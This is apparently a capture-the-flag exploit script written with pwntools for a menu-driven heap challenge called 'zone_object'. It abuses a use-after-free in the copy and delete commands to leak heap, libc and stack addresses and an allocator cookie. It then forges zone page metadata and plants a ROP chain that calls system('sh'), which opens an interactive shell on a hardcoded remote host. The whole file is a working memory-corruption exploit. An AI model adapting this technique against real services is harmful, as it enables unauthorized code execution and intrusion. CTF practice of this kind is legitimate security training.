#!/usr/bin/env python3

from pwn import *

def add(idx, val, name):
    r.sendlineafter("> ", b'1')
    r.sendlineafter("Index: ", str(idx).encode())
    r.sendlineafter("ID: ", str(val).encode())
    r.sendlineafter("length: ", str(len(name)).encode())
    r.sendafter("Name: ", name)

def add1(idx, val, name):
    r.sendlineafter("> ", b'1')
    r.sendlineafter("Index: ", str(idx).encode())
    r.sendlineafter("ID: ", str(val).encode())
    r.sendlineafter("length: ", str(len(name)).encode())


def delete(idx):
    r.sendlineafter("> ", b'2')
    r.sendlineafter("Index: ", str(idx).encode())

def copy(idx, idx_from):
    r.sendlineafter("> ", b'3')
    r.sendlineafter("Index: ", str(idx).encode())
    r.sendlineafter("from: ", str(idx_from).encode())
    
def view(idx):
    r.sendlineafter("> ", b'4')
    r.sendlineafter("Index: ", str(idx).encode())

#r = gdb.debug("./zone_object_patched")
#r = remote("localhost", 2006)
r = remote("103.163.25.143", 20008)
for i in range(63):
    add(i, i, str(i).encode())
for i in range(63, 127):
    add(i, 0, str(5).encode())

add(127, 127, str(5).encode())
add(128, 0, b'aaaa')
add(129, 0, b'aaab')
for i in range(130, 160):
    add(i, i, str(i).encode())
copy(160, 127)
copy(161, 128)
copy(162, 130)

for i in range(127, 160):
    delete(i)

for i in range(127, 160):
    add(i, 0, str(5).encode())

for i in range(163, 381):
    add(i, 0, str(5).encode())

view(160)
r.recvuntil("ID: ")
leak = int(r.recvline()[:-1],10) - 0x6050
libc = leak + 0xf000
system = libc + 0x50d60


log.info("LEAK: " + hex(leak))
log.info("LIBC: " + hex(libc))

for i in range(254, 381):
    delete(i)


def arb_read(where, len):
    delete(1)
    add(1, 1, (b'\0'.ljust(0x48, b'\0') + p64(len) + p64(where)).ljust(0x80,b'\0'))
    view(161)



def bit_idx(zone, base, ptr):
    return zone + ((ptr - base) // 8)

arb_read(leak + 0x40, 0x10)
r.recvuntil("Name: ")
cookie = r.recv(0x10)

environ = arb_read(libc + 0x221200, 0x8)
r.recvuntil("Name: ")
stack = u64(r.recv(8))
log.info("STACK: " + hex(stack))
value_zone_2 = leak + 0x4000

for i in range(20, 63):
    delete(i)
delete(6)
delete(7)
delete(1)
payload = (p64(0) + p64(1) + p64(leak + 0x18) + p64(1) + p64(0)*2 + cookie + p64(0) + p64(1) + p64(value_zone_2 + 0x11) + p64(1) + p64(0)*2 + cookie).ljust(0x80,b'\0')
add(1, 1, payload)
copy(6, 161)  
delete(6)

copy(7, 160)  
delete(7)
add(0x2ff, 0, b'\0'*0x140)
fake_page = p32(0x1c)
fake_page += p32(1)
fake_page += p32(0)
fake_page += p32(0x2000)
fake_page += p64(leak + 0x50)
fake_page += p64(leak - 0x2000)
fake_page += p64(leak)*2
fake_page += p64(0)*2 + cookie
fake_page += b'sh;'
add(0x300, 0, (fake_page).ljust(0x80, b'\0'))

fake_page = p32(0x8)
fake_page += p32(1)
fake_page += p32(0)
fake_page += p32(0x2000)
fake_page += p64(leak + 0x50)
fake_page += p64(stack - 0x1c0)
fake_page += p64(leak - 0x2000)*2
fake_page += p64(0)*2 + cookie

add(0x301, 0, (fake_page).ljust(0x80, b'\0'))

pop_rdi_rbp = libc + 0x000000000002a745
rop = p64(pop_rdi_rbp) + p64(leak + 0x50) + p64(0) + p64(system)
add(0x302, 0, (rop).ljust(0x140, b'\0'))
'''r.sendlineafter("> ", b'1')
r.sendlineafter("Index: ", str(0x302).encode())
r.sendlineafter("ID: ", str(0).encode())
r.sendlineafter("length: ", str(len(b'AAA')).encode())
pause()
r.sendafter("Name: ", b'AAA')'''
r.interactive()